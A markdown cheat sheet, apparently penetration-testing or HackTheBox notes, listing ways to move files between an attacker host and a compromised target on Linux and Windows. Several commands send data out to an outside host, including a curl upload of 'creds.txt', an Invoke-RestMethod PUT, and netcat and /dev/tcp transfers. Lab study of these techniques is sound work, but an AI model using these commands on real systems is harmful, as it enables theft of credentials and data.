# All kinds of file transfers from linux to windows and vice versa

### base64
 Transfer files via base64
  ```
  Linux:
    Step 1(target): cat <file> | base64 -w 0 | xclip     ### xclip copies the output to your clipboard, so you can paste the base64
    Step 2(host)  : echo <b64String> | base64 -d > file
  
  
  Windows :
    Might work, not sure: [System.Text.Encoding]::Unicode.GetBytes(<file>)
  
    Step 1(target): certutil -encode <file> <tmpOutput> && findstr /v /c:- <tmpOutput> > <endFile>
    Optional step 1(target): certutil -decode <endFile> <plaintextFile>
  
    Example:
    certutil -encode data.txt tmp.b64 && findstr /v /c:- tmp.b64 > data.b64
    certutil -decode data.b64 data.txt
  ```

### dev tcp
 Example with a limited shell
 ```
 Step 1(host)  : nc -lvnp <port> < file.Txt
 Step 2(target): bash -c "cat < /dev/tcp/<hostIP>/<port> > ./file.txt"
 
 Don't use 'bash -c' if you have a working bash shell.
 ```
 
### python http server
 Transfer files if python is on the box
 ```
 Step 1(host)  : python -m SimpleHTTPServer <port> / python3 http.server <port>
 Step 2(target): curl <targetIP>:<port>/file > file
 
 Alternate step 2(host): wget http://<targetIP>:<port>/filename	# Go into /tmp if permission denied
 ```
 
### ncat
 Transfer files via ncat (make sure you have ncat v7.70 or higher, 'nc' should use 'ncat'):
 ```
 Step 1(target): nc -lvnp <port> < file
 Step 2(host)  : nc <targetIP> <port> > file
 ```
 
### nginx
 Setting up an nginx server
 ```
 https://www.youtube.com/watch?v=7ifJOon5-G8 @ 15:00	#Ippsec Olympus htb
 
 Setting up nginx for file uploads:
 
 Step 1(host): cd /etc/nginx/sites-available; sudo mkdir file_upload
 Step 2(host): su; cat default | grep -v '\#' | grep . > file_upload 
 
 Set 'file_upload' to this:
 
 server {
 	listen 9090 default_server;
 	server_name hackerman.hack;
 	location / {
 		root /var/www/upload;
 		dav_methods PUT;
 	}
 }
 
 Step 3(host): sudo ln -s /etc/nginx/sites-available/file_upload /etc/nginx/sites-enabled/file_upload
 Step 4(host): sudo systemctl restart/start/stop nginx
 Step 5(host): sudo chown www-data /var/www/upload/
 Step 6(host): sudo chmod 777 /var/www/upload/
 ```

 Uploading files via nginx:
 ```
 https://www.youtube.com/watch?v=7ifJOon5-G8 @ 15:00 	#Ippsec Olympus htb

 Linux:
	syntax : curl --upload-file <file> <hostIP>:<port>
	example: curl --upload-file creds.txt 10.12.15.67:9090

 Windows powershell:
 	syntax : powershell -c 'Invoke-RestMethod -Method <method> -Uri "http://<hostIP>:<port>/<file>" -Body <file/variable>'
 	example: powershell -c 'Invoke-RestMethod -Method PUT -Uri "http://10.13.12.20:9090/file.txt" -Body file.txt/$output'
 ```
 
### SCP
 Get files via scp (port 22)
 ```
 Step 1(host): scp <user>@<ip>:file.txt ./
 
 When tunneling, use this:
 
 Alternate step 1(host): scp -P <port> <user>@<IP>:<filePath> ./
 
 example: scp -P 1234 dave@localhost:/home/dave/root.txt.gpg ./
 ```
